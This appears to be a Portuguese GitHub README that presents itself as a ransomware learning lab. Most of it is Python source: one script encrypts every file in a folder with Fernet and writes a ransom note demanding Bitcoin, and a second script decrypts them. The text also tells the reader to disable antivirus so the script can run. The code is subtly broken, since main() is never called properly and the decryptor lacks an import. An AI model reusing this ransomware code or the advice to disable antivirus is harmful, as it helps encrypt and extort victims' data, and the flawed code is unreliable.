# RANSOMWARE
Simulando um malware de captura de dados simples em python e aprendendo a se proteger
Constrido o ambiente> 
 
 
 

Em uma pasta com o nome malware>
criar uma outra pasta com o nome dados_confidencias e outro senhas.txt

e um file rasamware.py
com essa programaçao: 

 
 
from cryptography.fernet import Fernet
import os
#01 gerar uma chave e salvá-la em um arquivo
def gerar_chave():  
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)
#02 carregar a chave salva
def carregar_chave():  
    return open("chave.key", "rb").read()
#03 criptografar um unico arquivo
def criptografar_arquivos(arquivo, chave):  
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados) 
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)
#04 encontrar arquivos para criptografar
def encontrar_arquivos(diretorio):  
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista
#05 mensagem de resgate
def criar_mensagem_resgate():  
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados! \n.")
        f.write("Para recuperar seus arquivos, envia 1 Bitcoin para o endereço XXXXXX. com o comprovante \n")
        f.write("depois disso, enviamos a chave para recuperar seus dados.\n")
#06 Execução do ransomware
def main():  
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivos(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransomware executado! Arquivos criptografados.")
    if __name__ == "__main__":
        main()    


quando execute e o antivirus esta ligado apaga o arquivo> 
 


 


para funcionar tem que desligar o antivirus> 

mas quando executa 


>>>>>>>>>>>>>>>>>>>>>>>

Descriptografando os arquivos

criando arquivo descriptografar.py


 
 
#carregando as bibliotecas
from cryptography.fernet import Fernet
#onde vai carregar a chavekey e o que foi criptrografado.
def carregar_chave():  
    return open("chave.key", "rb").read()
#descriptografar um unico arquivo
def descriptografar_arquivos(arquivo, chave):  
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
        dados_desencriptados = f.decrypt(dados) 
    with open(arquivo, "wb") as file:
        file.write(dados_desencriptados)
#encontrar os arquivos na pasta test_files      
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista
#execução da descriptografia mensagem
def main():  
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        descriptografar_arquivos(arquivo, chave)
    print("Arquivos restaurados com sucesso!")    
if __name__ == "__main__":
    main()  
 



colocando pra rodar 
retorna com tudo recuperado.

 


<img width="764" height="2793" alt="image" src="https://github.com/user-attachments/assets/ed77de46-47a9-4660-bf6b-91bf3c1b89f8" />
